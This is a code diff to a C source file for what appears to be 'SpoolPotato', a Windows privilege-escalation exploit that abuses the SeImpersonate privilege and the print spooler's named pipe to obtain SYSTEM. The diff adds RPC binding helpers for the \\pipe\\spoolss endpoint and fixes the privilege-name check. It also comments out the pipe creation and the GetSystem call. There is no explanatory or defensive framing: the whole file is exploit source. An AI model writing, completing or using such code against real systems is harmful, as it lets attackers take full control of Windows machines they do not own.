@@ -46,6 +46,50 @@ void DebugLog(const wchar_t* Format, ...) {
 }
 #endif
 
+////////
+////////
+// RPC helpers
+////////
+
+handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
+{
+	RPC_STATUS RpcStatus;
+	RPC_WSTR StringBinding;
+	handle_t BindingHandle;
+
+	if (RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB", (RPC_WSTR)L"ncacn_np", (RPC_WSTR)lpStr, (RPC_WSTR)L"\\pipe\\spoolss", NULL, &StringBinding) != RPC_S_OK)
+		return NULL;
+
+	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);
+
+	RpcStringFreeW(&StringBinding);
+
+	if (RpcStatus != RPC_S_OK)
+		return NULL;
+
+	return BindingHandle;
+}
+
+void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
+{
+	RpcBindingFree(&BindingHandle);
+}
+
+void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
+{
+	return((void __RPC_FAR*) malloc(cBytes));
+}
+
+void __RPC_USER midl_user_free(void __RPC_FAR* p)
+{
+	free(p);
+}
+
+////////
+////////
+// Privilege/token manipulation logic
+////////
+
 BOOL EnablePrivilege(const wchar_t *PrivilegeName) {
 	BOOL bResult = FALSE;
 	HANDLE hToken = INVALID_HANDLE_VALUE;
@@ -99,7 +143,7 @@ BOOL EnablePrivilege(const wchar_t *PrivilegeName) {
 				goto cleanup;
 			}
 
-			if (!_wcsicmp(pwszPrivilegeName, pwszPrivilegeToCheck))
+			if (!_wcsicmp(pwszPrivilegeName, PrivilegeName))
 			{
 				TOKEN_PRIVILEGES tp = { 0 };
 
@@ -148,7 +192,7 @@ DWORD SpoolPotato()
 	}
 
 	DEBUG(L"[+] Found privilege: %ws\n", SE_IMPERSONATE_NAME);
-
+	/*
 	if (!GenerateRandomPipeName(&pwszPipeName))
 	{
 		DEBUG(L"[-] Failed to generate a name for the pipe.\n");
@@ -187,7 +231,7 @@ DWORD SpoolPotato()
 	}
 
 	GetSystem(hSpoolPipe);
-
+	*/
 cleanup:
 	if (hSpoolPipe)
 		CloseHandle(hSpoolPipe);
